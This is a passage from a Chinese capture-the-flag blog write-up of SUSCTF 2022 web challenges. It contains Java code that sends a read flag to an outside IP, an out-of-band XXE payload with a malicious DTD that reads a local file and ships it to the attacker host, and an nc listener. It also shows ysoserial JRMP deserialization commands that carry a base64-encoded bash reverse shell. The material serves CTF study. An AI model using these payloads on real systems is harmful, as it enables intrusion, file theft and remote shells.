in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            flag += str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        File f = new File(&quot;/etc/passwd&quot;);</span></span><br><span class="line"><span class="comment">		Scanner sc = new Scanner(f);</span></span><br><span class="line"><span class="comment">		while (sc.hasNextLine())&#123;</span></span><br><span class="line"><span class="comment">    		str += sc.nextLine(); </span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://121.5.169.223:39454/?flag=&quot;</span>+flag);</span><br><span class="line">        HttpURLConnection con = (HttpURLConnection) url.openConnection();</span><br><span class="line">        con.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加请求头</span></span><br><span class="line">        con.setRequestProperty(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;feng&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> responseCode = con.getResponseCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="baby-gadget-v2-0-and-revenge"><a href="#baby-gadget-v2-0-and-revenge" class="headerlink" title="baby gadget v2.0 and revenge"></a>baby gadget v2.0 and revenge</h2><p>xxe绕过外带</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf-8 -t utf-16be &lt; xxe.xml &gt; xxe-utf-16.xml</span><br><span class="line"></span><br><span class="line">//POST</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://121.5.169.223:39801/evil.dtd&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;number&gt;</span><br><span class="line">a</span><br><span class="line">&lt;/number&gt;</span><br><span class="line">&lt;name&gt;</span><br><span class="line">b</span><br><span class="line">&lt;/name&gt;</span><br><span class="line">&lt;/user&gt;</span><br><span class="line"></span><br><span class="line">// evil.dtd</span><br><span class="line">&lt;!ENTITY % file SYSTEM &#x27;file:///hint.txt&#x27;&gt;</span><br><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://121.5.169.223:39802/?content=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%payload;</span><br><span class="line">%send;</span><br><span class="line"></span><br><span class="line">//shell</span><br><span class="line">nc -lvvp 39802</span><br></pre></td></tr></table></figure>
+
+<p>hint.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JRE: </span><br><span class="line">8u191</span><br><span class="line">Dependency:</span><br><span class="line">commons-collections3.1</span><br></pre></td></tr></table></figure>
+
+<p>存在黑名单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;java.util.Hashtable&quot;</span><br><span class="line">&quot;java.util.HashSet&quot;</span><br><span class="line">&quot;java.util.HashMap&quot;</span><br><span class="line">&quot;javax.management.BadAttributeValueExpException&quot;</span><br><span class="line">&quot;java.util.PriorityQueue&quot;</span><br></pre></td></tr></table></figure>
+
+<p>非预期</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//通过JRMP打cc </span><br><span class="line">攻击方在自己的服务器使用exploit/JRMPListener开启一个rmi监听</span><br><span class="line">往存在漏洞的服务器发送payloads/JRMPClient，payload中已经设置了攻击者服务器ip及JRMPListener监听的端口，漏洞服务器反序列化该payload后，会去连接攻击者开启的rmi监听，在通信过程中，攻击者服务器会发送一个可执行命令的payload（假如存在漏洞的服务器中有使用org.apacje.commons.collections包，则可以发送CommonsCollections系列的payload），从而达到命令执行的结果。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar ysoserial.jar JRMPClient 121.5.169.223:39555|base64 -w 0</span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener  39555 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8jEuNS4xNjkuMjIzLzM5Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>对于CC5或者CC6来说，ban掉的只是入口处的类，再另找能触发到比如hashCode函数的起始链就可以了</p>
+<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_0gJrGD2as79se08W_mucg">NEP</a></p>
+<p><a target="_blank" rel="noopener" href="https://rvu5pcz1il.feishu.cn/docs/doccn3Pcq9v0YPXBXtxWLNNr5Kd#IMYQ37">b3f0re</a> pass:tuGL</p>
+<p><a target="_blank" rel="noopener" href="https://team-su.github.io/passages/2022-2-28-SUSCTF/">SU</a></p>
+<p><a target="_blank" rel="noopener" href="http://tttang.com/archive/1454/">Retr_0</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/123242116">bfengj</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fxxkdors"><span class="toc-number">1.</span> <span class="toc-text">Fxxkdors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML-practice"><span class="toc-number">2.</span> <span class="toc-text">HTML_practice</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-note"><span class="toc-number">3.</span> <span class="toc-text">ez_note</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rubbish-maker"><span class="toc-number">4.</span> <span class="toc-text">rubbish maker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-gadget-v1-0-and-revenge"><span class="toc-number">5.</span> <span class="toc-text">baby gadget v1.0 and revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-gadget-v2-0-and-revenge"><span class="toc-number">6.</span> <span class="toc-text">baby gadget v2.0 and revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WP"><span class="toc-number">7.</span> <span class="toc-text">WP</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2022/03/02/2022030209/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2022/03/02/2022030209/&text=SUSCTF2022WEB"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2022/03/02/2022030209/&title=SUSCTF2022WEB"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2022/03/02/2022030209/&is_video=false&description=SUSCTF2022WEB"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SUSCTF2022WEB&body=Check out this article: https://tefuir72.github.io/2022/03/02/2022030209/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2022/03/02/2022030209/&title=SUSCTF2022WEB"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2022/03/02/2022030209/&title=SUSCTF2022WEB"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2022/03/02/2022030209/&title=SUSCTF2022WEB"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2022/03/02/2022030209/&title=SUSCTF2022WEB"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2022/03/02/2022030209/&name=SUSCTF2022WEB&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2022/03/02/2022030209/&t=SUSCTF2022WEB"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Te Fuir
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+ 
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+   
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
